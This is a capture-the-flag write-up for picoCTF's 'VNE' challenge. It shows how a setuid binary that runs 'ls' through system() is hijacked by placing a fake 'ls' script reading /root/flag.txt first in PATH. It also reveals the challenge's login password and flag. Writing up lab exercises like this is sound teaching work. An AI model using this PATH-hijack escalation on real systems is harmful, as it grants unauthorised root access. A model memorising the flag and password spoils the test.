# VNE
We've got a binary that can list directories as root, try it out !! (200 Points)
ssh to saturn.picoctf.net:55701, and run the binary named "bin" once connected. Login as ctf-player with the password, 3f39b042

## Solution
The program calls some listing program on the path that we set to the environment variable 'SECRET\_DIR':
```
ctf-player@pico-chall$ ./bin
Error: SECRET_DIR environment variable is not set
ctf-player@pico-chall$ export SECRET_DIR=/root
ctf-player@pico-chall$ ./bin
Listing the content of /root as root:
flag.txt
ctf-player@pico-chall$
```

As we can see there is a file name 'flag.txt' in the root folder.

Downloading the binary 'bin' and quickly reversing it with Ghidra, show that there is a call of the C++ function 'system()' to call a certain program. The guess it, that 'ls' is called. Debugging with gdb shows that this assumption is correct:
```
[root@picoctf VNE]$ gdb ./bin
GNU gdb (GDB) 13.1
[...]
pwndbg> r
[...]
process 292738 is executing new program: /usr/bin/ls
[...]
pwndbg>
```

So now our guess is that the binarie calls 'ls' just over the relative path. It will check the PATH environment variable of the calling user to find the real binary. If this is the case we can just create our own 'ls' file in the home directory and manipulate the PATH variable to check first in this directory for binaries.

Our own 'ls' file looks like this:
```bash
#!/bin/bash
cat /root/flag.txt
```

Upload it to the server, manipulate the PATH and run 'bin' again:
```
ctf-player@pico-chall$ ls -al
total 32
drwxr-xr-x 1 ctf-player ctf-player    51 Mar 22 18:27 .
drwxr-xr-x 1 root       root          24 Mar 16 01:59 ..
-rw------- 1 ctf-player ctf-player    39 Mar 22 18:26 .bash_history
drwx------ 2 ctf-player ctf-player    34 Mar 22 18:25 .cache
-rw-r--r-- 1 root       root          67 Mar 16 01:59 .profile
-rwsr-xr-x 1 root       root       18752 Mar 16 01:59 bin
-rwxr-xr-x 1 ctf-player ctf-player    31 Mar 22 18:27 ls
ctf-player@pico-chall$ cat ls
#!/bin/bash
cat /root/flag.txt
ctf-player@pico-chall$ ./bin
Error: SECRET_DIR environment variable is not set
ctf-player@pico-chall$ export SECRET_DIR=/root
ctf-player@pico-chall$ ./bin
Listing the content of /root as root:
flag.txt
ctf-player@pico-chall$ env
SHELL=/bin/bash
PWD=/home/ctf-player
LOGNAME=ctf-player
SECRET_DIR=/root
MOTD_SHOWN=pam
HOME=/home/ctf-player
SSH_CONNECTION=127.0.0.1 54414 127.0.0.1 22
TERM=tmux-256color
USER=ctf-player
SHLVL=1
PS1=\[\e[35m\]\u\[\e[m\]@\[\e[35m\]pico-chall\[\e[m\]$
SSH_CLIENT=127.0.0.1 54414 22
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
SSH_TTY=/dev/pts/0
_=/usr/bin/env
ctf-player@pico-chall$ export PATH=/home/ctf-player:$PATH
ctf-player@pico-chall$ echo $PATH
/home/ctf-player:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
ctf-player@pico-chall$
ctf-player@pico-chall$
ctf-player@pico-chall$ ./bin
Listing the content of /root as root:
picoCTF{Power_t0_man!pul4t3_3nv_1670f174}ctf-player@pico-chall$ logout
Connection to saturn.picoctf.net closed.
[root@picoctf VNE]$
```

My guess seems correct and we got the flag.
